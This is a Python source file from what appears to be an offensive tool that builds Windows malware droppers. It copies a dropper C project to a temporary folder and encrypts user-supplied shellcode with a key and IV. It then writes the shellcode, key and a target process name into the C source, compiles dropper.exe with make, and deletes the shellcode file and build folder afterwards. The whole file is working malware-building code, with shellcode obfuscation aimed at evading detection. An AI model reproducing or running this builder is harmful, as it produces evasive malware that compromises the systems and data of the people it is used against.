import os
import subprocess
import tempfile
import shutil

from datetime import datetime
from .shellcode_generator import generate_shellcode
from .config_setup import setup_config_header


DROPPER_CORE_PATH = '../dropper_core/'
OUTPUT_FILE = '../outputs/dropper.exe'

def copy_project_to_temp():
    # Create a unique temporary directory
    temp_dir = tempfile.mkdtemp()

    # Path to the original project folder
    project_core_path = os.path.abspath(DROPPER_CORE_PATH)

    # Check if the project_core folder exists
    if not os.path.exists(project_core_path):
        print(f"Error: The directory '{project_core_path}' does not exist.")
        return None

    # Copy the contents of the project_core folder to the temporary directory
    try:
        shutil.copytree(project_core_path, temp_dir, dirs_exist_ok=True)
        print(f"Project core successfully copied to {temp_dir}")
        return temp_dir
    except Exception as e:
        print(f"Error while copying the folder: {e}")
        return None

def replace_placeholders(file_path, replacements):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        for placeholder, value in replacements.items():
            if placeholder in line:
                lines[i] = line.replace(placeholder, value)
                break

    with open(file_path, 'w') as file:
        file.writelines(lines)

def set_makefile_source_files(source_path):    
    c_files = []
    for root, _, files in os.walk(source_path):
        for file in files:
            if file.endswith(".c"):
                c_files.append(os.path.relpath(os.path.join(root, file), start=source_path))

    formatted_sources = ""
    for i in range(0, len(c_files), 2):
        line = ' '.join(c_files[i:i+2])
        if i + 2 < len(c_files):
            formatted_sources += line + " \\\n"
        else:
            formatted_sources += line

    replace_placeholders(os.path.join(source_path, "Makefile"), {"/* SOURCE_FILES */": formatted_sources})    

def format_shellcode(shellcode: str):
    shellcode_list = shellcode.split(", ")
    formatted_shellcode = "unsigned char Payload[] = {\n\t"
    
    for i in range(0, len(shellcode_list), 24):
        line = ", ".join(byte for byte in shellcode_list[i:i+24])
        formatted_shellcode += line + ",\n\t"
    formatted_shellcode = formatted_shellcode.rstrip(",\n\t") + "\n};"

    return formatted_shellcode

def delete_file_or_directory(path: str = ""):
    """
    Deletes a file or directory at the specified path.

    :param path: The path to the file or directory to be deleted.
    """
    if not os.path.exists(path):
        print(f"The path '{path}' does not exist.")
        return

    if os.path.isfile(path):
        try:
            os.remove(path)
            print(f"File '{path}' has been deleted.")
        except Exception as e:
            print(f"Error deleting file '{path}': {e}")
    elif os.path.isdir(path):
        try:
            shutil.rmtree(path)
            print(f"Directory '{path}' has been deleted.")
        except Exception as e:
            print(f"Error deleting directory '{path}': {e}")
    else:
        print(f"The path '{path}' is neither a file nor a directory.")
    

def build_dropper(encryption_method: str, preprocessing_macros: dict, placeholder_options: dict):
    """Builds a dropper by copying project files, generating shellcode, replacing placeholders, and running Makefile."""
    print('🔨 Compiling Dropper...')
    
    # Extract known parameters with default values
    out_filename = placeholder_options.get("out_filename")
    shellcode_path = placeholder_options.get("shellcode_path")
    
    # Step 1: Copy the project to a temporary directory
    temp_dir = copy_project_to_temp()

    # Step 2: Generate obfuscated shellcode
    shellcode, enc_key, iv = generate_shellcode(placeholder_options['shellcode'], algorithm=encryption_method.split('_')[0].lower())
    
    # Step 3: Replace placeholders in dropper.c
    placehodlers = {"/* SHELLCODE */": format_shellcode(shellcode)}
    if enc_key:
        placehodlers["/* KEY */"] = f"unsigned char key [] = {{\n\t{enc_key}\n}};"
    if iv:
        placehodlers["/* IV */"] = f"unsigned char iv [] = {{\n\t{iv}\n}};"
    if placeholder_options.get("process_name"):
        placehodlers["/* PROCESS_NAME */"] = f"L\"{placeholder_options.get('process_name')}\""
    
    dropper_source_path = os.path.join(temp_dir, "dropper.c")
    replace_placeholders(dropper_source_path, placehodlers)    
    
    # Step 4: Prepare shellcode argument
    shellcode_arg = shellcode_path if shellcode_path else placeholder_options.get('shellcode_text', '')

    # Step 5: Please preprocesing macros in the file config.h
    setup_config_header(preprocessing_macros, temp_dir)

    # Step 6: Construct the Make command
    set_makefile_source_files(temp_dir)
    command = ["make", "-f", "./Makefile"] + [
        f"SHELLCODE={shellcode_arg.replace('~', 'IN')}",
        f"OUTPUT_FILE={out_filename.replace('~', 'IN')}"
    ]

    print("🔹 Running command:", " ".join(command))  # Debugging output
    
    # Step 7: Run the make command with error handling
    try:
        subprocess.run(command, check=True, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        print("✅ Compilation done successfully.")
    except subprocess.CalledProcessError as e:
        print(f"❌ Compilation failed: {e}")
        print(f"#### Error Details ####")
        print(f"### Command:\n{command}\n")
        print(f"### stdout:\n{e.stdout}\n")
        print(f"### stderr:\n{e.stderr}\n")
        
    # Step 8: Move the output file to the specified output directory
    src = os.path.join(temp_dir, "bin", "dropper.exe")
    dst_dir = "./dropper_outputs/"
    dst = os.path.join(dst_dir, out_filename)
    
    if os.path.exists(dst):
        base, ext = os.path.splitext(out_filename)
        new_filename = f"{base}_{datetime.now().strftime("%d_%m_%Y-%H_%M_%S")}{ext}"
        dst = os.path.join(dst_dir, new_filename)
    
    try:
        print(src, dst)
        shutil.move(src, dst)
        print("✅ Output file moved successfully.")
    except Exception as e:
        print(f"❌ Failed to move output file: {e}")
        
    # Step 9: Clean up the temporary directory
    if shellcode_path:
        delete_file_or_directory(shellcode_path)
    delete_file_or_directory(temp_dir)